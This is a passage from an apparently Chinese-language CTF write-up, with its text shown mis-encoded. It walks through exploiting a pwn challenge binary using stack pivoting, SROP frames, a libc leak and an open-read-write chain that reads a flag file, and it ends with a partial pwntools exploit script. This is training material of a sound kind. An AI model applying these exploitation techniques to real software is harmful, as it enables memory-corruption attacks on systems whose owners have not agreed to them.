·æ˜¯èƒ½ç›´æ¥è·³åˆ°ä¸Šé¢æ‰§è¡Œï¼Œä½†æ˜¯rbpåœ¨å¤ªä¸Šé¢äº†ï¼Œreadè¯»çš„æ—¶å€™è¯»ä¸åˆ°åº•ä¸‹çš„<code>0x7fffffffdb38</code>åœ°å€ï¼Œæ²¡æ³•æŠŠè¿™é‡Œçš„libcåœ°å€æ”¹æˆsyscall</p></li><li><p>ä¸ºä»€ä¹ˆä¸ç›´æ¥è·³åˆ°ä¸‹é¢ï¼Œè€Œæ˜¯è¦å…ˆå»ä¸‹é¢å†åˆ°ä¸Šé¢å‘¢ï¼šç›´æ¥åœ¨ä¸‹é¢è°ƒç”¨readçš„è¯ç¡®å®å¯ä»¥ï¼Œä½†æ˜¯è¿™ä¸ªreadæ˜¯ä¼šè§¦å‘shadowæ£€æµ‹ï¼Œå› ä¸ºåœ¨__libc_start_call_mainçš„ä¸‹æ–¹æ²¡æœ‰leaveç»„åˆï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡leaveç›´æ¥å°†æ ˆç§»è¿‡å»è¿›è€Œé€šè¿‡æ ˆè¿”å›æ¥èº²shadowæ£€æµ‹ã€‚è§¦å‘shadowå‡½æ•°åï¼Œä¼špushä¸€å †å€¼è¿›æ ˆï¼Œå°±ä¼šè¦†ç›–æ‰<code>0x7fffffffdb10</code>æˆ–<code>0x7fffffffdb18</code>è¿™ä¸¤ä¸ªå­—æ®µä¸­çš„å…¶ä¸­ä¸€ä¸ª</p></li><li><p>ä¸‹é¢çš„0x10å­—èŠ‚ç›¸å½“äºä¸­è½¬ç«™ï¼Œè½¬åˆ°ä¸Šé¢æ‰§è¡Œread</p></li><li><p>å›¾ç‰‡åº•éƒ¨çš„<code>0x7fffffffdb38</code>è¿™é‡Œçš„libcåœ°å€æ˜¯ä¸èƒ½åŠ¨çš„ï¼Œè¿™æ˜¯æœ¬æ–‡æœ€å…³é”®çš„åœ°å€<img src="/2025/08/30/ret2all/Pasted image 20250830134333.png" alt="Pasted image 20250830134333" style="zoom:50%;"></p><p>ä¸‹å›¾ç»¿æ¡†ä¸ºå¯è¢«readè¯»å…¥ä¿®æ”¹çš„éƒ¨åˆ†ğŸ‘‡<img src="/2025/08/30/ret2all/Pasted image 20250830134442.png" alt="Pasted image 20250830134442" style="zoom:50%;"></p><h3 id="â‘¦SROP"><a href="#â‘¦SROP" class="headerlink" title="â‘¦SROP"></a>â‘¦SROP</h3><p>æ­¤æ—¶ropé“¾æ‰§è¡Œå®Œæ¯•ï¼Œæ¥ä¸‹æ¥å‡†å¤‡è¯»å…¥SROPå­—æ®µ<br>ä½†æ˜¯è¿™ä¸ªreadä¼šè¢«shadowæ£€æµ‹(å› ä¸º<strong>æ­¤æ—¶rspåœ¨readçš„bufåŒºåŸŸä¹‹å¤–</strong>)<br> éœ€è¦å…ˆè¯»ä¸€æ®µå¯é€šè¿‡æ£€æµ‹çš„</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç¬¬3æ¬¡send</span></span><br><span class="line">p.send(<span class="string">b&#x27;I love you I feel lonely&#x27;</span> * <span class="number">4</span> + p64(RBP) + p64(RET) + p64(RBP + <span class="number">0xf0</span>) + p64(read))</span><br></pre></td></tr></table></figure><p>ä¸‹å›¾ä¸ºreadå°†è¦retæ—¶çš„æ ˆç»“æ„<img src="/2025/08/30/ret2all/Pasted image 20250830152751.png" alt="Pasted image 20250830152751" style="zoom:50%;"></p><ul><li>å‡½æ•°æ­£å¸¸çš„ç¬¬1æ¬¡<code>leave;ret</code>ç»“æŸï¼Œç”±äºæ£€æµ‹RBPå’ŒRETå†…å®¹å›ºå®šï¼Œrbpå›ºå®šä¸º <code>0x7fffffffdb10</code>ï¼Œå­˜çš„åœ°å€å€¼ä¸ºä¹‹å‰å¤‡å¥½çš„é£æ°´<img src="/2025/08/30/ret2all/Pasted image 20250830153357.png" alt="Pasted image 20250830153357" style="zoom:50%;"></li><li>(vulnå‡½æ•°ç»“æŸ)ç¬¬2æ¬¡<code>leave;ret</code>ç»“æŸï¼Œæ­¤æ—¶çš„rbpå’Œripå°±æ˜¯ç¬¬2æ¬¡sendæ—¶æå‰å¤‡å¥½çš„é£æ°´ï¼ŒrbpæŒ‡å‘çš„åœ°å€ä¸ºç¬¬3æ¬¡sendæˆ‘ä»¬æ§åˆ¶çš„rbpå€¼<img src="/2025/08/30/ret2all/Pasted image 20250830153640.png" alt="Pasted image 20250830153640"></li><li>æ ˆé£æ°´çš„<code>leave;ret</code>ç»“æŸï¼Œrbpå˜ä¸ºç¬¬3æ¬¡sendæˆ‘ä»¬æ§åˆ¶çš„rbpå€¼ï¼Œå°†è¦æ‰§è¡Œread<img src="/2025/08/30/ret2all/Pasted image 20250830160047.png" alt="Pasted image 20250830160047" style="zoom:50%;"><img src="/2025/08/30/ret2all/Pasted image 20250830160310.png" alt="Pasted image 20250830160310" style="zoom:50%;"><br><img src="/2025/08/30/ret2all/Pasted image 20250830161934.png" alt="Pasted image 20250830161934" style="zoom:50%;"><blockquote><p><img src="/2025/08/30/ret2all/Pasted image 20250829231038.png" alt="Pasted image 20250829231038"><code>syscall</code>å°±æ˜¯è°ƒç”¨syscallçš„åœ°å€ï¼Œè°ƒç”¨çš„æ—¶å€™ç”±äºè¿›è¡Œäº†retï¼Œæ‰€ä»¥rspä¼šåŠ 8ï¼ŒæŒ‡å‘<code>uc_flags</code><br><code>uc_flags</code>å­—æ®µéœ€è¦è®¾ç½®ä¸º0ã€‚æˆ–è€…ä¸€ä¸ªå¯è¯»åœ°å€ï¼Œå¹¶ä¸”è¿™ä¸ªå¯è¯»åœ°å€çš„æœ«ç¬¬3ä¸ªbitä¸èƒ½ä¸º1ï¼Œä¾‹å¦‚æˆ‘ä¹‹å‰é€‰ç”¨çš„leaveçš„æœ«å°¾æ˜¯2ï¼Œå³0010ï¼Œä»å³å¾€å·¦æ•°ç¬¬3ä¸ªæ•°æ˜¯0ï¼Œåˆ™è¯¥åœ°å€æ˜¯åˆæ³•çš„<br><br><code>rip</code>è¦ä¸€ä¸ªå¯æ‰§è¡Œåœ°å€<br><br><code>cs/gs/fs</code>å­—æ®µä¸€èˆ¬è®¾ç½®ä¸º0x33ï¼Œä¸»è¦æ˜¯ä¸ºäº†è®¾ç½®csï¼Œè¯´å¾—å‡†ç¡®ç‚¹å‰ä¸¤ä¸ªå­—èŠ‚éœ€è¦æ˜¯0x0033ï¼Œåé¢çš„å­—èŠ‚éšä¾¿è®¾ç½®ã€‚csä¸º0x33ä»£è¡¨æ­¤æ—¶ç¨‹åºæ˜¯ä»¥64ä½è¿è¡Œçš„ï¼Œ0x22ä»£è¡¨æ˜¯32ä½ï¼Œå¦‚æœè¿™é‡Œè®¾ç½®é”™è¯¯ï¼Œé‚£ä¹ˆç¨‹åºä¼šç›´æ¥åŠ¨ä¸äº†ã€‚åé¢çš„gså’Œfså­—æ®µä¸æ˜¯é‚£ä¹ˆé‡è¦<br><br><code>&amp;fpstate</code>å­—æ®µéœ€è¦è®¾ç½®ä¸º0ã€‚æˆ–è€…ä¸€ä¸ªå¯è¯»åœ°å€ï¼Œå¹¶ä¸”è¯¥åœ°å€æ»¡è¶³æ ˆå¯¹é½ï¼Œå¹¶ä¸”è¯¥åœ°å€+0x18çš„ä½ç½®çš„å€¼å–ä½32ä½å€¼åå†å–é«˜16ä½å€¼è¦æ˜¯0ï¼Œå› ä¸º<code>fpstate</code>æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œè¿™ä¸ªä½ç½®æ˜¯ç»“æ„ä½“ä¸­çš„<code>mxcsr</code>å­—æ®µï¼Œè¿™æ˜¯ä¸€ä¸ª32ä½çš„å­—æ®µï¼Œå…¶é«˜16ä½æœ€å¥½ä¸èƒ½æœ‰å€¼ã€‚å¯è§è¯¥å­—æ®µå¦‚æœæƒ³å–ä¸€ä¸ªåˆæ³•åœ°å€æ˜¯æ¯”è¾ƒå›°éš¾çš„ï¼Œæ‰€ä»¥èƒ½è®¾ç½®0å°±è®¾ç½®0<br><br>SROPæ¯”è¾ƒå¤æ‚ï¼Œæ¶‰åŠç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„åˆ‡æ¢ï¼Œä½†æ˜¯ç®€å•è¯´ï¼Œå°±æ˜¯è®¾ç½®æ ˆä¸Šå€¼åˆ°å¯„å­˜å™¨ä¸­ï¼Œè°ƒç”¨syscallåï¼Œrspä¼šæŒ‡å‘<code>uc_flags</code>ï¼ŒæŒ‰ç…§å„ä¸ªå­—æ®µè®¾ç½®å³å¯ï¼Œä¸€èˆ¬æ¥è®²å‰é¢13ä¸ªå­—æ®µéƒ½ä¼šè®¾ç½®ä¸º0ï¼Œä¹Ÿå°±æ˜¯<code>p64(0) * 13</code><br><br>æœ¬é¢˜readä¸èƒ½è¯»å…¥å¤ªå¤šæ•°æ®ï¼Œåªèƒ½æ˜¯0x60ï¼Œåé¢è¿˜æœ‰0x28è¦ç”¨æ¥è¿›è¡Œæ§åˆ¶ï¼Œè¿™ä¸ª0x60å¤§å°åˆšå¥½æ˜¯ä»<code>rdi</code>å­—æ®µåˆ°<code>err</code>å­—æ®µï¼Œéšåçš„ç¬¬4ä¸ªå­—é•¿éœ€è¦æ§åˆ¶<code>&amp;fpstate</code>å­—æ®µï¼Œéœ€è¦ä¸º0<br><br>è¿›è¡Œé”™ä½åï¼Œæ˜¯ä»<code>rdi</code>å­—æ®µçš„å‰8ä¸ªå­—èŠ‚åˆ°<code>cs/gs/fs</code>å­—æ®µï¼Œéšåçš„ç¬¬5ä¸ªå­—é•¿éœ€è¦æ§åˆ¶<code>&amp;fpstate</code>å­—æ®µï¼Œéœ€è¦ä¸º0ã€‚ä½ç½®æœ‰é™ï¼Œæ‰€ä»¥æœ¬æ–‡æ²¡æœ‰å»ä¸“é—¨æ§åˆ¶å‰é¢13ä¸ªå­—æ®µï¼Œè€Œæ˜¯ç›´æ¥ä»<code>rdi</code>å­—æ®µå¼€å§‹å†™ï¼Œå¹¶ä¸”è¿›è¡Œäº†é”™ä½ï¼Œä»<code>rdi</code>å­—æ®µçš„å‰8ä¸ªå­—èŠ‚å¼€å§‹å†™</p></blockquote></li></ul><p>è¯»å…¥å‰</p><p><img src="/2025/08/30/ret2all/Pasted image 20250830163710.png" alt="Pasted image 20250830163710" style="zoom:50%;"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#frame = SigreturnFrame()</span></span><br><span class="line"><span class="comment">#frame.rax = 0</span></span><br><span class="line"><span class="comment">#frame.rbx = 0x6edca</span></span><br><span class="line"><span class="comment">#frame.rdi = 0</span></span><br><span class="line"><span class="comment">#frame.rsi = RBP + 0x30</span></span><br><span class="line"><span class="comment">#frame.rdx = 0x200</span></span><br><span class="line"><span class="comment">#frame.rsp = RBP + 0x40</span></span><br><span class="line"><span class="comment">#frame.rbp = RBP + 0x65</span></span><br><span class="line"><span class="comment">#frame.rip = read2</span></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0</span>) + p64(RBP + <span class="number">0x30</span>) + p64(RBP + <span class="number">0x65</span>) + p64(<span class="number">0x6edca</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(RBP + <span class="number">0x40</span>) + p64(read2) + p64(<span class="number">0</span>) + p64(<span class="number">0x33</span>) + p64(RBP + <span class="number">0x150</span> + <span class="number">1</span>) + p64(read) + p64(RBP + <span class="number">0x20</span>) + p64(leave))</span><br></pre></td></tr></table></figure><p>è¯»å…¥å</p><p><img src="/2025/08/30/ret2all/Pasted image 20250830165241.png" alt="Pasted image 20250830165241" style="zoom:50%;"></p><p>ç¬¬ä¸€æ¬¡SROPç”±äºæ²¡æ³•åˆ©ç”¨é‚£ä¸ªsyscallè°ƒç”¨ä¸€ä¸ªå‚æ•°æ­£ç¡®çš„å‡½æ•°ï¼Œæ‰€ä»¥ä¸»è¦æ§åˆ¶rbxå­—æ®µï¼Œåé¢å°±èƒ½è°ƒç”¨magic gadgetè°ƒåç§»æ¢ä¸ªsyscallï¼Œç›´æ¥æ¢æˆ<code>syscall; ret</code>å°±èˆ’æœäº†ï¼Œç”¨ropperéšä¾¿æ‰¾äº†ä¸ªlibcé‡Œçš„<code>syscall; ret</code>ï¼Œæ‰€ä»¥rbxè®¾ç½®ä¸ºäº†0x6edcaã€‚é¡ºå¸¦ripæ˜¯read2ï¼Œç›´æ¥è°ƒç”¨readï¼Œå› ä¸ºè¿™æ ·è°ƒç”¨çš„readå¾ˆèˆ’æœï¼Œå¯ä»¥æ ˆè¿”å›ç»•shadowï¼Œ<strong>rdxè¿˜å¤§</strong></p><p>å…ˆleaveï¼Œè·³è½¬åˆ°ä¸Šé¢çš„rbpä½ç½®ï¼Œè¿™é‡Œæœ‰ä¸ªleaveç»„åˆï¼Œæ‰§è¡Œreadã€‚</p><p><img src="/2025/08/30/ret2all/Pasted image 20250830170105.png" alt="Pasted image 20250830170105" style="zoom:50%;"></p><p>è¦è°ƒç”¨sigreturnéœ€è¦raxä¸º15ï¼Œraxå¯„å­˜å™¨å­˜æ”¾çš„æ˜¯å‡½æ•°çš„è¿”å›å€¼ï¼Œå¦‚æœreadè¯»äº†15ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå‡½æ•°è¿”å›å€¼å°±æ˜¯15ï¼ŒåŒç†writeå¦‚æœå†™äº†15ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¹Ÿæ˜¯15ã€‚æ²¡æœ‰æ§åˆ¶raxçš„gadgetçš„æƒ…å†µä¸‹ï¼Œä¸€èˆ¬å°±ç”¨è¿™ç§æ–¹æ³•æ¥æ§åˆ¶raxçš„å€¼</p><p>readäº†15ä¸ªå­—èŠ‚åå†è·³è½¬åˆ°syscallå°±èƒ½æ‰§è¡Œsigreturnäº†<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">7</span> + p64(rbp))</span><br></pre></td></tr></table></figure><br>readå…ˆè¯»å…¥7ä¸ªåƒåœ¾å­—èŠ‚ï¼Œéšåå°†è‡ªå·±çš„è¿”å›åœ°å€æ”¹ä¸ºäº†<code>pop rbp</code>ï¼Œè¿™æ ·å¯ä»¥è·³è¿‡æ£€æµ‹ï¼Œç›´æ¥å¼€å§‹ropï¼Œéšåå¦‚å›¾ç¤ºä¸€è·¯ropåˆ°syscall</p><p><img src="/2025/08/30/ret2all/Pasted image 20250830171945.png" alt="Pasted image 20250830171945" style="zoom:50%;"></p><p><img src="/2025/08/30/ret2all/Pasted image 20250830172300.png" alt="Pasted image 20250830172300" style="zoom:50%;"></p><p>å¯„å­˜å™¨ä¿®æ”¹å®Œæ¯•</p><p><img src="/2025/08/30/ret2all/Pasted image 20250830172700.png" alt="Pasted image 20250830172700" style="zoom:50%;"></p><p>æ¥ä¸‹æ¥å‡†å¤‡è°ƒç”¨dup2(1, 2)ï¼Œreadé‡å†™ä¸€ä¸‹SROPå­—æ®µï¼Œå¹¶ä¸”æ ˆé£æ°´ä¸€ä¸‹ï¼Œæå‰åœ¨SROPå­—æ®µçš„åƒåœ¾å­—æ®µä¸­ç•™ä¸‹åé¢è¦ç”¨çš„gadgetï¼Œå¹¶ä¸”ropä¸€ä¸‹ï¼Œå°†è¿™ä¸ªsyscallæ¢æˆæ›´å¥½çš„syscallå†è°ƒç”¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#frame = SigreturnFrame()</span></span><br><span class="line"><span class="comment">#frame.rax = 33</span></span><br><span class="line"><span class="comment">#frame.rdi = 1</span></span><br><span class="line"><span class="comment">#frame.rsi = 2</span></span><br><span class="line"><span class="comment">#frame.rdx = 0</span></span><br><span class="line"><span class="comment">#frame.rsp = RBP + 0x28</span></span><br><span class="line"><span class="comment">#frame.rbp = RBP + 0x68</span></span><br><span class="line"><span class="comment">#frame.rip = ret</span></span><br><span class="line">io.send(p64(leave) + p64(add_rbp_3d_ebx) + p64(rbp) + p64(RBP + <span class="number">0xa8</span> + <span class="number">1</span>) + p64(read) + p64(RBP + <span class="number">0x20</span>) + p64(leave) + p64(RBP + <span class="number">0xd0</span>) + p64(read) + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(RBP + <span class="number">0x68</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">33</span>) + p64(<span class="number">0</span>) + p64(RBP + <span class="number">0x28</span>) + p64(ret) + p64(<span class="number">0</span>) + p64(<span class="number">0x33</span>))</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">7</span> + p64(rbp))</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬çš„SROPï¼Œä¼šè®¾ç½®rspä¸ºä¸€ä¸ªå…¶ä»–çš„å€¼ï¼Œripä¸ºsyscallçš„åœ°å€ï¼Œè¿™æ ·ä¸ä¼šå¡è„šã€‚ä½†æ˜¯æœ¬é¢˜æ— æ³•è·å¾—syscallçš„åœ°å€ï¼Œæ‰€ä»¥ripè®¾ç½®ä¸ºretï¼Œrspè®¾ç½®ä¸ºè¿™é‡Œçš„<code>RBP + 0x28</code>ä¹Ÿå°±æ˜¯syscallçš„åœ°å€ï¼Œè¿™æ ·è°ƒç”¨å®Œç¬¬ä¸€æ¬¡syscallè®¾ç½®å¥½å¯„å­˜å™¨åï¼Œå°±èƒ½å†è°ƒç”¨ä¸€æ¬¡syscallå»æ‰§è¡Œå‡½æ•°</p><p>éœ€è¦æ³¨æ„syscallåä¼šretï¼Œè€Œæ­¤æ—¶rspæ˜¯syscallä¸‹é¢ä¸€è¡Œï¼Œè¿™ä¸€è¡Œåˆšå¥½æ˜¯ä¹‹å‰SROPæ—¶çš„<code>uc_flags</code>å­—æ®µï¼Œæ‰€ä»¥è¿™é‡Œè¦ä¸€ä¸ªå¯æ‰§è¡Œçš„åœ°å€ï¼Œå¹¶ä¸”åˆæ³•</p><p>rbpåœ¨ä¸Šä¸€æ¬¡çš„SROPä¸­å·²ç»è®¾ç½®ä¸ºäº†syscallçš„æ ˆåœ°å€åŠ 0x3dï¼Œropæ—¶ç›´æ¥åˆ©ç”¨magic gadgetå¢åŠ syscallåœ°å€çš„å€¼ï¼Œæ¢æˆæ›´å¥½çš„syscall</p><p><img src="/2025/08/30/ret2all/Pasted image 20250830175151.png" alt="Pasted image 20250830175151" style="zoom:50%;"></p><p>ä¸Šä¸€æ¬¡SROPè®¾ç½®äº†rspï¼Œæ‰€ä»¥è°ƒç”¨readåè¿”å›åœ°å€ä¼šè¢«è¦†ç›–ä¸º<code>add_rbp_3d_ebx</code>ï¼Œç›´æ¥å¼€å§‹rop<br>æ‰§è¡Œ<code>add_rbp_3d_ebx</code>æ¢ä¸ªsyscallï¼Œéšåread15ä¸ªå­—èŠ‚ï¼Œå’Œä¸Šé¢ä¸€æ ·ï¼Œreadå®Œåropè·³åˆ°syscall<br>ä¸ºä»€ä¹ˆè¦ç•™leaveä½œä¸ºæ ˆé£æ°´å‘¢ï¼Ÿå› ä¸ºrspå’Œripéƒ½ä¸å¥½æ§ï¼Œä½†æ˜¯rbpå¥½æ§ï¼Œè€Œåˆ©ç”¨rbpçš„åœ°æ–¹å°±æ˜¯leaveï¼Œæ‰€ä»¥åé¢ä¼šåˆ©ç”¨leaveä½œä¸ºä¸€ä¸ªä¸­è½¬ç«™æ¥å®Œæˆè·³è·ƒ</p><p><img src="/2025/08/30/ret2all/Pasted image 20250830180302.png" alt="Pasted image 20250830180302" style="zoom:50%;"></p><p><img src="/2025/08/30/ret2all/Pasted image 20250830180551.png" alt="Pasted image 20250830180551" style="zoom:50%;"></p><p>æˆåŠŸè°ƒç”¨<code>dup2(1,2)</code>ï¼Œéšåæ˜¯retï¼Œretåˆ°leaveï¼Œç„¶åå†ç”±leaveè½¬åˆ°ä¸‹é¢çš„leaveç»„åˆå¤„ï¼Œè°ƒç”¨readï¼Œå†æ¬¡é‡å†™SROPä»¥è°ƒç”¨write</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#frame = SigreturnFrame()</span></span><br><span class="line"><span class="comment">#frame.rax = 1</span></span><br><span class="line"><span class="comment">#frame.rdi = 2</span></span><br><span class="line"><span class="comment">#frame.rsi = RBP + 0x28</span></span><br><span class="line"><span class="comment">#frame.rdx = 0x200</span></span><br><span class="line"><span class="comment">#frame.rsp = RBP + 0x28</span></span><br><span class="line"><span class="comment">#frame.rbp = RBP + 0xe8</span></span><br><span class="line"><span class="comment">#frame.rip = ret</span></span><br><span class="line">p.send(p64(rbp) + p64(RBP + <span class="number">0xd8</span> + <span class="number">1</span>) + p64(read) + p64(RBP + <span class="number">0x20</span>) + p64(leave) + p64(<span class="number">2</span>) + p64(RBP + <span class="number">0x28</span>) + p64(RBP + <span class="number">0xe8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(RBP + <span class="number">0x28</span>) + p64(ret) + p64(<span class="number">0</span>) + p64(<span class="number">0x33</span>) + p64(read3))</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">7</span> + p64(rbp))</span><br></pre></td></tr></table></figure><p><img src="/2025/08/30/ret2all/Pasted image 20250830181603.png" alt="Pasted image 20250830181603" style="zoom:50%;"></p><p><img src="/2025/08/30/ret2all/Pasted image 20250830181831.png" alt="Pasted image 20250830181831"></p><p><img src="/2025/08/30/ret2all/Pasted image 20250830181811.png" alt="Pasted image 20250830181811" style="zoom:50%;">è°ƒç”¨writeæˆåŠŸï¼Œå¹¶ä¸”è½¬åˆ°read</p><h3 id="â‘§ret2libc"><a href="#â‘§ret2libc" class="headerlink" title="â‘§ret2libc"></a>â‘§ret2libc</h3><blockquote><p>ret2libcçš„æ„æ€å°±æ˜¯èƒ½å®Œå…¨è¿”å›åˆ°libcä¸Šï¼Œè™½ç„¶ç¨‹åºæ²¡æœ‰å¾ˆå¤šgadgetï¼Œä½†æ˜¯libcä¸Šgadgetä¸€å¤§å †ï¼Œéƒ½èƒ½ç›´æ¥ç”¨ROPgadgetæ‰¾åˆ°ï¼Œæ²¡æœ‰<code>pop rdx</code>ï¼Œå¯ä»¥ç”¨rbxæ¥æ§ï¼Œä¸è¿‡ä¹‹å‰writeå·²ç»è®¾ç½®äº†rdxä¸º0x200ï¼Œorwçš„æ—¶å€™å°±æ²¡æœ‰å¿…è¦æ§rdxäº†<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">syscall = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libcbase = syscall - <span class="number">0x98fb6</span></span><br><span class="line">success(<span class="string">&#x27;libcbase =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">rax = libcbase + <span class="number">0xdd237</span></span><br><span class="line">rdi = libcbase + <span class="number">0x10f75b</span></span><br><span class="line">rsi = libcbase + <span class="number">0x110a4d</span></span><br><span class="line">rbx = libcbase + <span class="number">0x586e4</span></span><br><span class="line">mov_rdx_rbx_pop_rbx_pop_r12_pop_rbp = libcbase + <span class="number">0xb0133</span></span><br></pre></td></tr></table></figure><br>æ¥æ”¶writeè¾“å‡º,å¾—libcåŸºå€ï¼Œéšåå°±å¯ä»¥éšæ„ropäº†</p><h3 id="â‘¨ORW"><a href="#â‘¨ORW" class="headerlink" title="â‘¨ORW"></a>â‘¨ORW</h3><p>orwæ˜¯åœ¨æ²™ç®±ç¦ç”¨äº†execveå‡½æ•°ä¸‹çš„å¸¸ç”¨æ”»å‡»æ‰‹æ³•ï¼Œé€šè¿‡openå‡ºflagæ–‡ä»¶ï¼Œç„¶åå†readè¯»flagæ–‡ä»¶ä¸­çš„å†…å®¹åˆ°å†…å­˜é‡Œï¼Œå†ç”¨writeå†™å‡ºflag<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#close(0)</span></span><br><span class="line"><span class="comment">#open(&#x27;./flag&#x27;, 0)</span></span><br><span class="line"><span class="comment">#read(0, RBP, 0x200)</span></span><br><span class="line"><span class="comment">#write(2, RBP, 0x200)</span></span><br><span class="line">io.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0xc0</span> + <span class="string">b&#x27;./flag\x00\x00&#x27;</span> + p64(rax) + p64(<span class="number">3</span>) + p64(rdi) + p64(<span class="number">0</span>) + p64(syscall) + p64(rax) + p64(<span class="number">2</span>) + p64(rdi) + p64(RBP + <span class="number">0xe8</span>) + p64(rsi) + p64(<span class="number">0</span>) + p64(syscall) + p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>) + p64(rsi) + p64(RBP) + p64(syscall) + p64(rax) + p64(<span class="number">1</span>) + p64(rdi) + p64(<span class="number">2</span>) + p64(syscall))</span><br></pre></td></tr></table></figure><br>å…ˆ<code>close(0)</code>ï¼Œå†<code>open(&#39;./flag&#39;, 0)</code>ï¼Œè¿™æ ·flagæ–‡ä»¶çš„fdå°±æ˜¯0ï¼Œç„¶å<code>read(0, RBP, 0x200)</code>å°±å¯ä»¥å°†flagçš„å€¼å†™å…¥RBPä¸­ï¼Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ç”±äº<code>close(0)</code>ï¼Œç°åœ¨å·²ç»æ— æ³•ä½¿ç”¨æ ‡å‡†è¾“å…¥ï¼ˆå¦‚æœåç»­éè¦ç”¨å¯ä»¥å…ˆdup2å†closeï¼‰ï¼Œæ‰€ä»¥è¿™æ˜¯æœ€åä¸€ä¸ªsendäº†ã€‚æœ€å<code>write(2, RBP, 0x200)</code>è¾“å‡ºflag</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>) </span><br><span class="line"><span class="comment">#p=remote(&#x27;ip&#x27;,port)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">RBP = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">RET = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;rbp_addr: &quot;</span>+<span class="built_in">hex</span>(RBP))</span><br><span class="line">success(<span class="string">&quot;ret_addr: &quot;</span>+<span class="built_in">hex</span>(RET))</span><br><span class="line"></span><br><span class="line">elfbase = RET - <span class="number">0x1871</span></span><br><span class="line">success(<span class="string">&quot;elfbase: &quot;</span>+<span class="built_in">hex</span>(elfbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">## gadgets</span></span><br><span class="line">leave = elfbase + <span class="number">0x1852</span> <span class="comment"># leave ; ret</span></span><br><span class="line"></span><br><span class="line">add_rbp_3d_ebx = elfbase + <span class="number">0x1252</span> <span class="comment"># add [rbp-0x3d],ebx ; ret</span></span><br><span class="line">pop_rbp = elfbase + <span class="number">0x1253</span> <span class="comment"># pop rbp ; ret</span></span><br><span class="line">ret = elfbase + <span class="number">0x1254</span> <span class="comment"># ret    </span></span><br><span class="line"><span class="comment">#ret2text</span></span><br><span class="line">read = elfbase + <span class="number">0x182F</span> <span class="comment">#æ§åˆ¶rbpä»è€Œæ§åˆ¶rsi,å³readå‡½æ•°çš„å‚æ•°bufï¼Œæ§åˆ¶readè¦è¯»åˆ°å“ªé‡Œ</span></span><br><span class="line">read2 = elfbase + <span class="number">0x1840</span> <span class="comment">#call _readå¼€å§‹ï¼Œé€‚åˆåé¢å·²ç»æ§åˆ¶å¥½äº†rsiå’Œrdxå‚æ•°ï¼Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨</span></span><br><span class="line">read3 = elfbase + <span class="number">0x183B</span> <span class="comment">#åé¢è°ƒç”¨writeåæ–¹ä¾¿è½¬è°ƒç”¨read</span></span><br><span class="line">check_word = <span class="string">b&#x27;I love you I feel lonely&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(check_word*<span class="number">4</span>  + p64(RBP) + p64(RET) + p64(RBP+<span class="number">0x10</span>) + p64(read) + p64(RBP-<span class="number">0x10</span>))</span><br><span class="line">a=p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0</span>) * <span class="number">7</span> + p64(RBP + <span class="number">0xf0</span>) + p64(read) + p64(leave) + p64(RBP + <span class="number">0x100</span>) + p64(leave) + p64(RBP - <span class="number">0x18</span>) + p64(leave) + p64(<span class="number">0</span>) + p8(<span class="number">0xec</span>))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.send(check_word * <span 